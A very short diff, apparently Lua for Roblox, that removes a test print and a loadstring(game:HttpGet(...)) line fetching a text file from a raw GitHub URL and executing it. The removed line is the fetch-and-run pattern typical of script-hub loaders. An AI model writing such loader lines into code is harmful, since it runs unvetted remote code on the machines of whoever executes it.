@@ -1,2 +1,0 @@
-print("teste")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MyQd4CMrRhHD/HUB/main/amostra.txt", true))()
